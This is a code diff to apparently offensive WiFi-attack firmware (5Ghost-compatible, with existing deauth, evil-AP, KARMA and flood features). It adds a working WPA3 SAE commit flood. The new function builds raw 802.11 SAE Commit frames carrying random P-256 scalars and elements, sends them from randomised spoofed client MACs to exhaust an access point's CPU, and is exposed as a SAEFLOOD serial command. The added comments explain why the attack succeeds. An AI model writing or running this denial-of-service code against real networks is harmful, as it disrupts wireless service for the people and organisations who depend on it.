@@ -1285,6 +1285,39 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
   wifi_tx_raw_frame(f, n);
 }
 
+// --- B4: SAE commit flood (WPA3 denial of service) --------------------------------------
+// WPA3 replaces the WPA2 4-way with SAE (Dragonfly). When an AP receives an Authentication frame
+// with algorithm 3 (SAE) and sequence 1 (Commit), it must run an elliptic-curve operation on the
+// scalar and element the frame carries *before* it can decide they are invalid. So a stream of
+// commits from many different source MACs keeps the AP's CPU busy validating points that never
+// belonged to anybody - the "dragonblood" denial of service. The values here are random on
+// purpose: they are invalid, and that is fine, because the expensive part happens first.
+//
+// Layout (IEEE 802.11-2016, 9.4.1.1 - Authentication, algorithm 3):
+//   auth algorithm (2, LE = 3) | auth sequence (2, LE = 1) | status code (2) |
+//   SAE Commit: group id (2, LE) | scalar | element
+// Group 19 (NIST P-256, the WPA3 default) is 32 + 64 bytes, which is what every consumer AP uses;
+// group 20 (P-384, 48 + 96) does not fit tx_stage, so it is deliberately not offered.
+// Args: SAEFLOOD <bssid-12hex> <chan> [count]
+#define SAE_GROUP_P256 19
+static void sae_send_commit(const uint8_t* bssid, const uint8_t* sta) {
+  uint8_t f[144];
+  int n = 0;
+  f[n++] = 0xB0; f[n++] = 0x00;           // frame control: authentication
+  f[n++] = 0x00; f[n++] = 0x00;           // duration
+  memcpy(f + n, bssid, 6); n += 6;        // addr1: the AP
+  memcpy(f + n, sta, 6); n += 6;          // addr2: the spoofed client
+  memcpy(f + n, bssid, 6); n += 6;        // addr3: BSSID
+  f[n++] = 0x00; f[n++] = 0x00;           // sequence (driver fills it)
+  f[n++] = 0x03; f[n++] = 0x00;           // auth algorithm: SAE
+  f[n++] = 0x01; f[n++] = 0x00;           // auth sequence: 1 = commit
+  f[n++] = 0x00; f[n++] = 0x00;           // status code: success
+  f[n++] = SAE_GROUP_P256; f[n++] = 0x00; // group id: NIST P-256
+  for(int i = 0; i < 32 + 64; i++) f[n++] = (uint8_t)random(0, 256);   // scalar + element
+  memcpy(tx_stage, f, n);
+  wifi_tx_raw_frame(tx_stage, n);
+}
+
 // --- B5: authentication / association flood --------------------------------------------
 // An AP reserves state for every client that starts associating (an association-table slot), and
 // that slot is only freed when the entry times out or the client leaves. Blasting authentication
@@ -1360,10 +1393,11 @@ static String flood_ssid_for(const uint8_t* bssid) {
 // --- A: HELLO/IDENT handshake + capability advertisement ----------------------
 // Mirrors 5Ghost's HELLO -> IDENT so a host can version-check and gate features.
 // caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
-// Ours on top: L=ble I=iBeacon C=BLE adv K=KARMA R=responder T=btm F=auth/assoc flood.
+// Ours on top: L=ble I=iBeacon C=BLE adv K=KARMA R=responder T=btm F=auth/assoc flood
+// A=sae commit flood.
 // We advertise "DSEBH" (no BLE -> no L/I/C/K).
 #define DELFY_FW_VERSION "1.0.0"
-#define DELFY_FW_CAPS "DSEBHLICKRTF"
+#define DELFY_FW_CAPS "DSEBHLICKRTFA"
 
 // --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
 #define DAUTH_MAX 8
@@ -2308,6 +2342,37 @@ void loop() {
         wext_set_channel(WLAN0_NAME, apch);
         for(int i = 0; i < frames; i++) btm_send_frame(bssid, (uint8_t)newch, TX_BCAST);
         String r = String("BTM:") + String((unsigned)frames) + " ch=" + String(newch);
+        Serial.println(r); Serial1.println(r);
+      }
+    }else if(readString.substring(0,8)=="SAEFLOOD"){
+      // B4: SAEFLOOD <bssid-12hex> <chan> [count]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
+      int count = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 64;
+      uint8_t bssid[6];
+      bool ok = (hex.length() == 12);
+      for(int i = 0; ok && i < 6; i++) {
+        int hi = hexnib(hex.charAt(i * 2));
+        int lo = hexnib(hex.charAt(i * 2 + 1));
+        if(hi < 0 || lo < 0) { ok = false; break; }
+        bssid[i] = (uint8_t)((hi << 4) | lo);
+      }
+      if(!ok) {
+        Serial.println("ERROR: SAEFLOOD needs a 12-hex bssid"); Serial1.println("ERROR: SAEFLOOD needs a 12-hex bssid");
+      }else{
+        if(apch < 1 || apch > 165) apch = 6;
+        if(count < 1 || count > 500) count = 64;
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, apch);
+        for(int i = 0; i < count; i++) {
+          flood_mac_rand();                 // a different client per commit: no state to reuse
+          sae_send_commit(bssid, flood_sta);
+          if((i & 15) == 15) delay(2);      // let the WiFi task breathe every 16 frames
+        }
+        String r = String("SAEFLOOD:") + String((unsigned)count) + " ch=" + String(apch);
         Serial.println(r); Serial1.println(r);
       }
     }else if(readString.substring(0,5)=="AUTHF" || readString.substring(0,5)=="ASSOC"){
